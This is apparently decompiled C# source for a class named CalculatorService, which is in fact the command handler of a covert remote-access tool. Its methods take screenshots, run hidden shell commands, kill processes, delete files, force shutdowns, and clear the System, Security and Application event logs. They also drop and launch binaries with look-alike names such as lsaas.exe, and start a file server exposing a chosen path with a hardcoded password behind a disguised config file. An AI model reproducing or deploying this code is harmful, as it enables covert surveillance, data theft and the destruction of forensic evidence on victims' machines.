using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Sp.Ced.Serv;

public class CalculatorService : ICalculator
{
	public class API
	{
		[DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetDC(IntPtr hWnd);

		[DllImport("user32.dll", ExactSpelling = true)]
		public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

		[DllImport("gdi32.dll", ExactSpelling = true)]
		public static extern IntPtr BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);

		[DllImport("user32.dll")]
		public static extern IntPtr GetDesktopWindow();
	}

	internal class ScreenShot
	{
		public static Bitmap Take()
		{
			//IL_002a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0030: Expected O, but got Unknown
			int width = Screen.get_PrimaryScreen().get_Bounds().Width;
			int height = Screen.get_PrimaryScreen().get_Bounds().Height;
			Bitmap val = new Bitmap(width, height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			IntPtr dC = API.GetDC(API.GetDesktopWindow());
			IntPtr hdc = val2.GetHdc();
			API.BitBlt(hdc, 0, 0, width, height, dC, 0, 0, 13369376);
			API.ReleaseDC(API.GetDesktopWindow(), dC);
			val2.ReleaseHdc(hdc);
			val2.Dispose();
			return val;
		}
	}

	public Shots A()
	{
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		Shots shots = new Shots();
		try
		{
			DateTime now = DateTime.Now;
			string text = Environment.MachineName.ToLower();
			if (text.Contains("cedint"))
			{
				text = text.Replace("cedint", "CT");
			}
			string error = text + "-" + now.Hour + "." + now.Minute + "." + now.Second + ".png";
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			MemoryStream memoryStream = new MemoryStream();
			Bitmap val = new Bitmap(bounds.Width, bounds.Height);
			try
			{
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				try
				{
					val2.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Png());
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			shots.Shot = memoryStream.ToArray();
			memoryStream.Close();
			shots.Error = error;
		}
		catch (Exception ex)
		{
			shots.Error = ex.ToString();
			shots.Shot = null;
		}
		return shots;
	}

	public Shots B()
	{
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Expected O, but got Unknown
		Shots shots = new Shots();
		try
		{
			DateTime now = DateTime.Now;
			string text = Environment.MachineName.ToLower();
			if (text.Contains("cedint"))
			{
				text = text.Replace("cedint", "CT");
			}
			string error = text + "-" + now.Hour + "." + now.Minute + "." + now.Second + ".png";
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			Bitmap val = new Bitmap(bounds.Width, bounds.Height);
			MemoryStream memoryStream = new MemoryStream();
			val = ScreenShot.Take();
			((Image)val).Save((Stream)memoryStream, ImageFormat.get_Png());
			((Image)val).Dispose();
			shots.Shot = memoryStream.ToArray();
			memoryStream.Close();
			shots.Error = error;
		}
		catch (Exception ex)
		{
			shots.Error = ex.ToString();
			shots.Shot = null;
		}
		return shots;
	}

	public string C(string path, string arg)
	{
		try
		{
			if (path.StartsWith("cmd") || path.StartsWith("net"))
			{
				Process process = new Process();
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.RedirectStandardError = true;
				process.StartInfo.FileName = path;
				if (arg != null)
				{
					process.StartInfo.Arguments = arg;
				}
				process.Start();
				process.WaitForExit(3000);
				string text = process.StandardOutput.ReadToEnd();
				string text2 = process.StandardError.ReadToEnd();
				return text + "\n" + text2;
			}
			if (arg != null)
			{
				Process.Start(path, arg);
			}
			else
			{
				Process.Start(path);
			}
			return path + " executed";
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public string D(string path)
	{
		Process[] processesByName = Process.GetProcessesByName(path);
		string text = " main window closed =";
		try
		{
			if (processesByName.Length == 0)
			{
				return "0 " + path + "s found";
			}
			processesByName[0].CloseMainWindow();
			processesByName[0].WaitForExit(3000);
			if (!processesByName[0].HasExited)
			{
				text = " killed = ";
				if (path.ToLower().Contains("skype") && File.Exists("c:\\Program Files\\Skype\\Phone\\Skype.exe"))
				{
					Process.Start("c:\\Program Files\\Skype\\Phone\\Skype.exe");
					Thread.Sleep(2000);
					processesByName = Process.GetProcessesByName(path);
					processesByName[0].CloseMainWindow();
					processesByName[0].WaitForExit(3000);
					if (processesByName[0].HasExited)
					{
						text = " main window closed =";
					}
					else
					{
						text = " killed = ";
						processesByName[0].Kill();
						processesByName[0].WaitForExit(1000);
					}
				}
				else
				{
					processesByName[0].Kill();
					processesByName[0].WaitForExit(1000);
				}
			}
			text = text + processesByName[0].HasExited + ", ";
			return processesByName.Length + " " + processesByName[0].ProcessName + "s found, 1" + text + Process.GetProcessesByName(path).Length + " left";
		}
		catch (Exception ex)
		{
			return processesByName.Length + " " + processesByName[0].ProcessName + "s found, 1" + text + Process.GetProcessesByName(path).Length + " left\n" + ex.Message;
		}
	}

	public string G()
	{
		try
		{
			Cursor.set_Position(new Point(Cursor.get_Position().X + 10, Cursor.get_Position().Y + 10));
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
		return "Now cursor at: " + Cursor.get_Position();
	}

	public string Del(string path)
	{
		string result = "Path not found:\n" + path;
		try
		{
			if (Directory.Exists(path))
			{
				Directory.Delete(path, recursive: true);
				result = "Directory deleted:\n" + path;
			}
			else if (File.Exists(path))
			{
				File.Delete(path);
				result = "File deleted:\n" + path;
			}
			return result;
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public DriveInfo[] H()
	{
		try
		{
			return DriveInfo.GetDrives();
		}
		catch (Exception)
		{
			return null;
		}
	}

	public string L()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					try
					{
						text = text + "Model: " + ((ManagementBaseObject)val2).get_Item("Model").ToString();
					}
					catch (Exception ex)
					{
						text = text + "Model: " + ex.Message;
					}
					try
					{
						text = text + "\nType: " + ((ManagementBaseObject)val2).get_Item("MediaType").ToString();
					}
					catch (Exception ex)
					{
						text = text + "\nType: " + ex.Message;
					}
					try
					{
						text = text + "\nInterface: " + ((ManagementBaseObject)val2).get_Item("InterfaceType").ToString();
					}
					catch (Exception ex)
					{
						text = text + "\nInterface: " + ex.Message;
					}
					try
					{
						object obj = text;
						text = string.Concat(obj, "\nCapacity: ", Math.Round(Convert.ToDouble(((ManagementBaseObject)val2).get_Item("Size")) / 1024.0 / 1024.0 / 1024.0, 2), " GB");
					}
					catch (Exception ex)
					{
						text = text + "\nCapacity: " + ex.Message;
					}
					try
					{
						text = text + "\nPartitions: " + ((ManagementBaseObject)val2).get_Item("Partitions").ToString();
					}
					catch (Exception ex)
					{
						text = text + "\nPartitions: " + ex.Message;
					}
					text += "\n\n";
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string[] logicalDrives = Environment.GetLogicalDrives();
			foreach (string text2 in logicalDrives)
			{
				text = text + text2 + "\t";
			}
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
		return text;
	}

	public string E(int time)
	{
		try
		{
			Process.Start("shutdown", "-s -f -t " + time);
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
		return "Shutdown initiatiated. Execution in " + time + " seconds";
	}

	public string F()
	{
		try
		{
			Process.Start("shutdown", "-a");
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
		return "Shutdown aborted";
	}

	public string N()
	{
		string empty = string.Empty;
		try
		{
			empty = Assembly.GetExecutingAssembly().GetName().Name;
			empty = empty + ", " + Assembly.GetExecutingAssembly().GetName().Version!.ToString();
			empty = empty + "\t" + File.GetCreationTime(Assembly.GetExecutingAssembly().Location).ToString("dd MMMM yyyy, HH:mm");
			return empty + "\n\nRemote CC path:\n" + Assembly.GetExecutingAssembly().Location;
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public string O()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		try
		{
			ConnectionOptions val = new ConnectionOptions();
			val.set_Impersonation((ImpersonationLevel)3);
			ManagementScope val2 = new ManagementScope("root\\CIMV2", val);
			val2.Connect();
			ManagementObject val3 = new ManagementObject("Win32_Service.Name='MsSpCed'");
			ManagementBaseObject methodParameters = val3.GetMethodParameters("Change");
			methodParameters.set_Item("DesktopInteract", (object)true);
			ManagementBaseObject val4 = val3.InvokeMethod("Change", methodParameters, (InvokeMethodOptions)null);
			return val4.get_Item("ReturnValue").ToString();
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public string P()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		try
		{
			Thread.Sleep(500);
			ConnectionOptions val = new ConnectionOptions();
			val.set_Impersonation((ImpersonationLevel)3);
			ManagementScope val2 = new ManagementScope("root\\CIMV2", val);
			val2.Connect();
			ManagementObject val3 = new ManagementObject("Win32_Service.Name='MsSpCed'");
			ManagementBaseObject val4 = val3.InvokeMethod("StopService", (ManagementBaseObject)null, (InvokeMethodOptions)null);
			return val4.get_Item("ReturnValue").ToString();
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public string R(byte[] file)
	{
		try
		{
			File.WriteAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "msspupd.exe"), file);
			Thread.Sleep(500);
			Process.Start(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "msspupd.exe"), "restart");
			return "Restarting... Del manual msspupd.exe";
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public string M(byte[][] files)
	{
		try
		{
			string fileName = Path.GetFileName(Assembly.GetExecutingAssembly().Location);
			File.WriteAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "msspupd.exe"), files[0]);
			File.WriteAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "new" + fileName), files[1]);
			File.WriteAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "lsaas.exe"), files[2]);
			Thread.Sleep(1000);
			Process.Start(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "msspupd.exe"), "update");
			return "Updating... Del manual msspupd.exe";
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public string Q()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		string text = "";
		try
		{
			EventLog val = new EventLog();
			val.set_Log("System");
			text = text + "System entries: " + val.get_Entries().get_Count();
			val.Clear();
			val.Close();
			text = text + ".\t\tEntries left: " + val.get_Entries().get_Count();
			val.set_Log("Security");
			text = text + "\nSecurity entries: " + val.get_Entries().get_Count();
			val.Clear();
			val.Close();
			text = text + ".\t\tEntries left: " + val.get_Entries().get_Count();
			val.set_Log("Application");
			text = text + "\nApplication entries: " + val.get_Entries().get_Count();
			val.Clear();
			val.Close();
			return text + ".\t\tEntries left: " + val.get_Entries().get_Count();
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public string U(byte[] file)
	{
		try
		{
			File.WriteAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "msspupd.exe"), file);
			Thread.Sleep(500);
			Process.Start(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "msspupd.exe"), "uninstall");
			return "Uninstalling...";
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public string FTO(string path)
	{
		string text = "";
		try
		{
			if (Process.GetProcessesByName("lsaas").Length > 0)
			{
				return "Server already started. Kill first...";
			}
			Process process = new Process();
			process.StartInfo.FileName = "lsaas.exe";
			string text2 = "BindInterface All\r\n                BindPort 64245\r\n                CommandTimeout 300\r\n                ConnectTimeout 15\r\n                MaxConnections 20\r\n                LookupHosts On\r\n                <User \"bob\">\r\n                Password \"1\"\r\n                Mount / ";
			text2 = text2 + path + "\r\n                Allow / Read List\r\n                </User>";
			using (StreamWriter streamWriter = new StreamWriter("c:\\windows\\system\\MCICFG.DRV"))
			{
				streamWriter.WriteLine(text2);
			}
			process.Start();
			return "Server started on " + path + ", PID: " + process.Id;
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public string FTF()
	{
		string text = "lsaas";
		string text2 = " killed = ";
		Process[] processesByName = Process.GetProcessesByName(text);
		try
		{
			if (processesByName.Length == 0)
			{
				return "0 " + text + "s found";
			}
			processesByName[0].Kill();
			processesByName[0].WaitForExit(2000);
			text2 = text2 + processesByName[0].HasExited + ", ";
			return processesByName.Length + " " + processesByName[0].ProcessName + " found, 1" + text2 + Process.GetProcessesByName(text).Length + " left";
		}
		catch (Exception ex)
		{
			return processesByName.Length + " " + processesByName[0].ProcessName + " found, 1" + text2 + Process.GetProcessesByName(text).Length + " left\n" + ex.Message;
		}
	}

	public string Zip(string pathtozip)
	{
		string result = "Path not found:\n" + pathtozip;
		string text = "C:\\Program Files\\7-Zip\\7z.exe";
		if (!File.Exists(text))
		{
			return "7-Zip not found.";
		}
		try
		{
			if (Directory.Exists(pathtozip) || File.Exists(pathtozip))
			{
				Process process = new Process();
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.RedirectStandardError = true;
				process.StartInfo.FileName = text;
				string text2 = "cc_7zip_" + DateTime.Now.ToString("hhmmss") + ".7z";
				process.StartInfo.Arguments = "a -t7z -mx0 " + text2 + " \"" + pathtozip + "\"";
				process.Start();
				process.WaitForExit(7000);
				string text3 = process.StandardOutput.ReadToEnd();
				string text4 = process.StandardError.ReadToEnd();
				result = text3 + "\n\n" + text4 + "\n\n" + Path.Combine(Environment.CurrentDirectory.ToString(), text2);
			}
			return result;
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}
}
